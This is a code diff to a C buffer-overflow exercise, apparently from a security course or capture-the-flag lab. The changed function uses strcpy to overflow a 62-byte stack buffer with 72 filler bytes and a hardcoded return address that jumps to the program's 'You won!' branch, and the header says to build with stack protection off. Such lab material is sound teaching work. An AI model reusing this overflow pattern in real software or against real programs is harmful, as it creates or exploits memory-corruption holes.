@@ -1,5 +1,5 @@
 /*
- * Compile this program with:
+* Compile this program with:
  * gcc -fno-stack-protector -Wno-stringop-overflow -o overflow overflow.c -g
  *
  * To run this program, you may need to disable ASLR
@@ -34,10 +34,11 @@
 int your_fcn(void) {
         char buf[62];
 
-        char input[79];
-        memset(input, 'A', 72);
-        memcpy(input + 72, "\x65\x12\x40", 3);
-        strcpy(buf, input);
+        /* 72 filler bytes, then address of the "You won!" branch (0x55555555520f),
+           little-endian low 6 bytes: 0f 52 55 55 55 55 */
+        strcpy(buf,
+          "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+          "\x0f\x52\x55\x55\x55\x55");
 
         return 0;
 }
